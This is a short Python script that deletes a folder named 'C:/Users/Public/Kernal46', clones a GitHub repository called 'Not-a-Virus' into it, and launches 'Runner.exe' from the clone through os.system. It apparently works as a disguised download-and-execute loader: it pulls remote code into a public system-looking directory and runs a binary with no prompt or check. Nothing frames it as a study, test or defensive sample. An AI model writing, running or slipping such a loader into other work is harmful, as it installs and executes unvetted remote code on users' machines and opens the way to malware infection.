from dulwich import porcelain
import os
import shutil
from time import sleep

path = 'C:/Users/Public/Kernal46'
def removePath(path):
    if (os.path.exists(path)):
        print(path, 'exists')
        files = os.listdir(path)
        print(files)
        for f in files:
            currentPath = os.path.join(path, f)
            if (os.path.exists(currentPath)):
                print(f, 'exists')
                if os.path.isdir(currentPath):
                    print(f, 'is a directory')
                    removePath(currentPath)
                else:
                    print(f, 'is a file')
                    os.remove(currentPath)
            else:
                print(f, 'does not exist')
        os.rmdir(path)

removePath(path)

porcelain.clone('https://github.com/romanjmock/Not-a-Virus', path)

os.chdir(path)

os.system('Dist/Runner/Runner.exe')